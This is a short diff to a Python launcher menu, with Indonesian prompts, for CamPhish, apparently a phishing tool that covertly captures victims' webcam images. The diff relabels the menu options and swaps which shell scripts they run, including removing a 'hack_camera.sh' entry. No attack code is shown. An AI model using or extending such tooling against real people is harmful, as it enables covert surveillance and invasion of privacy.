@@ -71,8 +71,8 @@ def clear_screen():
 def show_menu():
     clear_screen()
     print(LOGO.format(BLUE=BLUE, GREEN=GREEN, RED=RED))
-    print(f"{CYAN}[1]{WHITE} CamPhish V1")
-    print(f"{CYAN}[2]{WHITE} CamPhish V2")
+    print(f"{CYAN}[1]{WHITE} CamPhish (AUTO mode - Auto-download & fallback)")
+    print(f"{CYAN}[2]{WHITE} CamPhish (MANUAL mode - Standard setup)")
     print(f"{CYAN}[0]{WHITE} Exit")
 
 def execute_command(command):
@@ -114,10 +114,10 @@ def main():
         try:
             choice = input(f"{YELLOW}Pilih opsi: {RESET}")
             if choice == '1':
-                run_camphish("CamPhish", "camphish.sh")
+                run_camphish("CamPhish", "camphish_auto.sh")
                 input(f"\n{GREEN}Selesai. Tekan Enter untuk kembali ke menu.")
             elif choice == '2':
-                run_camphish("HACK-CAMERA", "hack_camera.sh")
+                run_camphish("CamPhish", "camphish.sh")
                 input(f"\n{GREEN}Selesai. Tekan Enter untuk kembali ke menu.")
             elif choice == '0':
                 clear_screen()
